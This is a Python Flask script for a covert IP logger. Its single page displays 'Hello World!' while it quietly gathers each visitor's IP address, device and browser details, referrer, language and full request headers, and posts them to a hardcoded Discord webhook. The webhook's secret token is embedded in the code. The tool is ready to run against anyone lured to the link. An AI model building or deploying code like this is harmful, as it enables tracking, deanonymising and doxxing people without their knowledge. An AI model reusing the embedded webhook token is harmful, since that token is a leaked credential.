from flask import Flask, request
import requests
import json
from datetime import datetime
import user_agents

app = Flask(__name__)

# Replace with your Discord webhook URL
DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1371421337154752542/nIiDoeeHEkLqIau1AXMshZB18QoDZgSRc__7Gew16p-96UX7HYWpZcs-6lLi8Os5XBwk"

def get_client_info():
    """Extract detailed client information from request"""
    ip = request.remote_addr
    # Try to get X-Forwarded-For if behind proxy
    x_forwarded_for = request.headers.get('X-Forwarded-For')
    if x_forwarded_for:
        ip = x_forwarded_for.split(',')[0].strip()
    
    user_agent_str = request.headers.get('User-Agent', 'Unknown')
    ua = user_agents.parse(user_agent_str)
    
    return {
        'ip': ip,
        'ip_lookup': f"https://whatismyipaddress.com/ip/{ip}",
        'ip_api': f"http://ip-api.com/#{ip}",
        'user_agent': user_agent_str,
        'device': {
            'browser': f"{ua.browser.family} {ua.browser.version_string}",
            'os': f"{ua.os.family} {ua.os.version_string}",
            'device': f"{ua.device.family}",
            'is_mobile': ua.is_mobile,
            'is_tablet': ua.is_tablet,
            'is_pc': ua.is_pc,
            'is_bot': ua.is_bot
        },
        'referrer': request.headers.get('Referer', 'No referrer'),
        'language': request.headers.get('Accept-Language', 'Unknown'),
        'timestamp': datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        'headers': dict(request.headers)
    }

def send_to_discord(data):
    """Send the collected data to Discord with rich embed"""
    device_info = "\n".join([
        f"• **Browser**: {data['device']['browser']}",
        f"• **OS**: {data['device']['os']}",
        f"• **Device**: {data['device']['device']}",
        f"• **Type**: {'Mobile' if data['device']['is_mobile'] else 'Tablet' if data['device']['is_tablet'] else 'PC' if data['device']['is_pc'] else 'Bot' if data['device']['is_bot'] else 'Unknown'}",
    ])
    
    lookup_links = "\n".join([
        f"• [WhatIsMyIPAddress]({data['ip_lookup']})",
        f"• [IP-API Lookup]({data['ip_api']})",
        f"• [IP2Location](https://www.ip2location.com/demo/{data['ip']})",
        f"• [AbuseIPDB](https://www.abuseipdb.com/check/{data['ip']})"
    ])
    
    embed = {
        "title": "🚀 New Visitor Logged",
        "color": 0x5865F2,  # Discord blue
        "fields": [
            {"name": "🌐 IP Address", "value": f"`{data['ip']}`", "inline": True},
            {"name": "🔍 Lookup Links", "value": lookup_links, "inline": True},
            {"name": "🖥️ Device Info", "value": device_info, "inline": False},
            {"name": "📎 Referrer", "value": data['referrer'], "inline": True},
            {"name": "🗣️ Language", "value": data['language'], "inline": True},
            {"name": "🕒 Timestamp", "value": data['timestamp'], "inline": True}
        ],
        "footer": {
            "text": "Webhook Logger | Auto-generated"
        }
    }
    
    payload = {
        "embeds": [embed],
        "username": "Visitor Logger",
        "avatar_url": "https://i.imgur.com/J5qKXWq.png"  # Optional: Replace with your icon
    }
    
    headers = {'Content-Type': 'application/json'}
    
    try:
        response = requests.post(
            DISCORD_WEBHOOK_URL,
            data=json.dumps(payload),
            headers=headers
        )
        response.raise_for_status()
    except requests.exceptions.RequestException as e:
        print(f"Error sending to Discord: {e}")

@app.route('/')
def log_visitor():
    """Main endpoint that logs visitors"""
    client_info = get_client_info()
    send_to_discord(client_info)
    return "Hello World!", 200

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
